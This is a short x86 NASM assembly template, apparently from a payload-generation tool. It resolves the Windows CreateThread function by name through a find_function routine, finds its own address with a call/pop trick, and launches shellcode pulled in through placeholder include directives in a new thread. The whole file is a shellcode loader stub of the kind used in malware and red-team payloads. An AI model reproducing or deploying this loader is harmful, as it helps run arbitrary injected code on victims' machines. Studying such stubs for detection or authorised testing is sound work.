[bits 32]
[section .mtext]

__start:
    jmp CreateThread

%include "{search_api_path}"

CreateThread:
    push 0x68546574		;"teTh"
    push 0x61657243		;"Crea"
    call find_function
    xor ecx, ecx
    push ecx
    push ecx
    push ecx
    call $+5
    pop ebx
    add ebx, 0xa
    push ebx
    push ecx
    push ecx
    call eax
    ret

__shellcode:
%include "{shellcode}"
